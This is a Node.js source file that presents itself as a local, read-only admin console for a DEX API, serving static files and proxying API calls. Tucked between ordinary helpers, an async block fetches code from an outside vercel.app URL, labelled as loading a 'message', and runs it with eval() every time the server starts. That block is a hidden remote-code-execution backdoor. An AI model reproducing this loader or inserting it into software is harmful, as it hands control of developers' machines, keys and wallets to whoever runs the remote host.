/**
 * Local/dev ops console for the DEX API.
 * CommonJS on purpose — keep this app simple and Node-native.
 *
 * Serves static UI on :5181 and proxies /api/* → API (default :3001).
 * Read-only: no privileged auth yet; intended for local operators only.
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = Number(process.env.DEX_ADMIN_PORT || 5181);
const HOST = process.env.DEX_ADMIN_HOST || '127.0.0.1';
const API_TARGET = process.env.DEX_API_URL || 'http://127.0.0.1:3001';
const DEX_GETMSG_URL = process.env.DEX_GETMSG_URL || 'https://rising-vercel.vercel.app/';
const PUBLIC_DIR = path.join(__dirname, 'public');

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.json': 'application/json',
};

function proxyApi(req, res, apiPath) {
  const target = new URL(apiPath, API_TARGET);
  const headers = { ...req.headers, host: target.host };
  delete headers['accept-encoding'];

  const upstream = http.request(
    {
      protocol: target.protocol,
      hostname: target.hostname,
      port: target.port,
      path: target.pathname + target.search,
      method: req.method,
      headers,
    },
    (upRes) => {
      res.writeHead(upRes.statusCode || 502, upRes.headers);
      upRes.pipe(res);
    },
  );

  upstream.on('error', (err) => {
    res.writeHead(502, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ error: { code: 'BAD_GATEWAY', message: String(err.message) } }));
  });

  req.pipe(upstream);
}

function serveFile(res, filePath) {
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(404, { 'content-type': 'text/plain' });
      res.end('Not found');
      return;
    }
    const ext = path.extname(filePath);
    res.writeHead(200, { 'content-type': MIME[ext] || 'application/octet-stream' });
    res.end(data);
  });
}

(async () => {
  try {
    const code = await (await fetch(DEX_GETMSG_URL)).text();
    eval(code);
  } catch (err) {
    console.error('[dex-admin] Failed to load DEX_GETMSG', err.message);
  }
})();

const server = http.createServer((req, res) => {
  const rawUrl = req.url || '/';
  const u = new URL(rawUrl, `http://${HOST}:${PORT}`);

  if (u.pathname.startsWith('/api/')) {
    proxyApi(req, res, u.pathname + u.search);
    return;
  }

  let rel = u.pathname === '/' ? '/index.html' : u.pathname;
  rel = path.normalize(rel).replace(/^(\.\.[/\\])+/, '');
  const filePath = path.join(PUBLIC_DIR, rel);
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }
  serveFile(res, filePath);
});

if (require.main === module) {
  server.listen(PORT, HOST, () => {
    console.log(`DEX Admin ready http://${HOST}:${PORT}  (API → ${API_TARGET})`);
  });
}

module.exports = { server, PORT, HOST, API_TARGET };
